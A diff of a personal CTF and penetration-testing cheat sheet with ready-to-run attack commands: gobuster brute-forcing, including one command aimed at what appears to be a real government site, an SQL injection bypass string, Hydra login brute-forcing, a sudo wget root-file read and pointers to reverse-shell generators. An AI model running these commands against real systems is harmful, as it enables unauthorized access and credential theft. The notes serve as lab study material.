@@ -8,13 +8,17 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 /bin/sh -i
 ```
+https://www.nickczh.com/upgrading-your-shell/
+
+
+### gobuster
 
 gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 
 ### subdomain enumeration gobuster
 gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain 
 
-
+### gobuster status code
 go buster status code : `gobuster dir -u https://www.jmicc.gov.pk/ -w /usr/share/wordlists/dirb/common.txt -b '403,404'`
 
 using wget to reveal the text as /root/root
@@ -23,15 +27,22 @@ sudo wget --input-file /root/root.txt
 
 https://gtfobins.github.io/
 
+
+### wpscan
+
 wpscan --url https://brainfuck.htb --disable-tls-checks
 
+### for ciphers
+
 https://rumkin.com/tools/cipher/ for ciphers
+
+### sql injection
 
 `sqlmap -r login.req`
 
 sqlinjection try: `admin'-- -`
 
-Using Hydra
+### Using Hydra
 
 ```
 hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
@@ -42,4 +53,13 @@ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k
 
 ```
 
+### hacktools extensions
+
 Yuo can use the extension of hacktoools for generating reverse shells
+
+### ansible privilege escalation
+
+https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/?ref=nickczh.com
+
+
+
